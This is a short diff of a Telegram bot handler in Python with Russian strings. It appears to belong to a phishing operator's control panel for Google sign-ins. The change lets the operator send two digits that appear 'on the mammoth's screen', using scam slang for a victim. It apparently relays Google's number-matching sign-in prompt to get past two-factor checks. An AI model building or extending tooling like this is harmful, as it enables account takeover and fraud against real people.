@@ -599,18 +599,11 @@ async def handle_google_control_callback(callback: CallbackQuery, bot: Bot):
 
     elif action == "ask_prompt":
         PENDING_GOOGLE_PROMPT[callback.from_user.id] = target_tg_id
-        db.set_google_auth_control(
-            DB_PATH,
-            tg_id=target_tg_id,
-            status="show_prompt",
-            prompt_number="42",
-        )
-        await callback.answer("📲 На экран выведено число 42!", show_alert=True)
+        await callback.answer("🔢 Отправьте 2 цифры в чат", show_alert=True)
         if callback.message:
             await callback.message.answer(
                 f"🔢 <b>Google Auth (ID <code>{target_tg_id}</code>)</b>\n\n"
-                "На экран мамонта выведено число <b>42</b>.\n"
-                "Чтобы изменить его, отправьте <b>2 новые цифры</b> в ответ на это сообщение:",
+                "Отправьте <b>2 новые цифры</b> в ответ на это сообщение (например: <code>42</code>, <code>79</code>), чтобы они вывелись на экран мамонта:",
                 parse_mode="HTML",
             )
 
